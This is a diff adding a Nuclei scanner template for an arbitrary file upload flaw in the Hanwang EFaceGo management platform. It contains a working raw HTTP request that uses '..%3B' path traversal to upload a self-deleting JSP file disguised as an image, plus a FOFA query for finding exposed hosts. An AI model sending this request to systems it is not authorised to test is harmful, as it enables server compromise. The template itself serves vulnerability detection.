@@ -1,0 +1,42 @@
+id: hanwang-upload-arbitrary-file
+
+info:
+  name: Hanwang EFaceGo Arbitrary File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    汉王e脸通综合管理平台的 upload.do 接口存在任意文件上传漏洞。攻击者可利用该漏洞上传任意文件，并访问该文件，导致敏感信息泄露、权限 escalation 等。
+  reference:
+    - https://github.com/wooluo/nuclei-templates-2025hw/blob/2a9916e7dd3609737956777fcf4cfb399a40ac7c/hanwang-upload-arbitrary-file.yaml
+  metadata:
+    fofa-query: icon_hash="1380907357"
+  tags: 汉王e脸通综合管理平台
+
+http:
+  - raw:
+      - |
+        POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabcxyzqw
+
+        ------WebKitFormBoundaryabcxyzqw
+        Content-Disposition: form-data; name="file"; filename="testaa.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("{{randstr}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryabcxyzqw--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "fileName"
+          - "createTime"
+          - "fileSize"
+        condition: and
+      - type: status
+        status:
+          - 200
